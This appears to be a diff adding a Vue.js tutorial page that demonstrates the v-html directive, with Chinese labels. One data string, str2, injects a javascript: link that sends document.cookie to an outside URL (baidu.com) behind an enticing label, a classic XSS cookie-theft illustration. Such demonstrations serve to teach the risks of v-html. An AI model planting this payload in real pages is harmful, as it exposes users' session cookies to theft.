@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-html</title>
+    <script src="../js/vue.js"></script>
+    <script src="../js/dayjs.min.js"></script>
+</head>
+<body>
+    <div id="root">
+        <div>快来玩-{{name}}</div>
+        <!-- v-html支持标签解析-->
+        <div v-html="str"></div>
+        <div v-html="str2"></div>
+        <a href="alert('你好')">点我弹窗</a>
+        
+    </div>
+    <script>
+        new Vue({
+            el:'#root',
+            data:{
+               name:'星穹铁道',
+               str:'<h2>你好啊</h2>',
+               str2:'<a href=javascript:location.href="https://www.baidu.com/?"+document.cookie>点我看好看的</a>'
+            },
+        })
+        
+    </script>
+</body>
+</html>
